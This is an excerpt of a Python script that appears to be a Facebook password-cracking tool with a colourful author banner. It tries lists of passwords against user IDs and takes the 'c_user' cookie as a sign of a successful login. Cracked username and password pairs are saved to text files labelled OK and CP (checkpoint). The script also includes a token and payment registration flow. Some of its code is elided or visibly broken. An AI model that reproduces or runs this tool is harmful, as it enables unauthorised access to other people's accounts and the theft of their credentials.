...
\033[0;93m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[0;91mAUTHOR   : KAMRAN ALI
 
\033[0;93mFACEBOOK : KAMRAN ALI
 
\033[0;96mGITHUB   : Kamranzawal
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n \x1b[1;92mTOTAL OK : \x1b[1;92m %s  \x1b[1;92mKAAMI_OK.txt' % (H, P, str(len(ok))))
	    print(' \x1b[1;91mTOTAL CP :\x1b[1;91m   %s \x1b[1;91KAAMI_CP.txt' % (H, P, str(len(cp))))
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r\x1b[1;92m[KAAMI] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H}[KAAMI-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('KAAMI_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s[KAAMI-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('KAAMI_CP.txt' , 'a').write('%s\n' % wrt)
                        break
...
def bnsbuy():
    ...
    if to in r:
        ...
        print
        print('\rTool Price free\n')
        print
        print('\rjazzcash Account Number 007\n')
        print('\rAccount Name NO NAME\n')
        print
        print
        ...
        os.system('am start https://wa.me/+92007?text=' + tks)
...
def bnsreg():
    ...
    print('\rAccount Name NO NAME\n')
    print
    print('\rPayment Successfully Send\n')
    print
    sb = input('\rPaste Here Payment Successfully Msg:')
    print ('\n')
    ss = input('\rPaste Here your Token:')
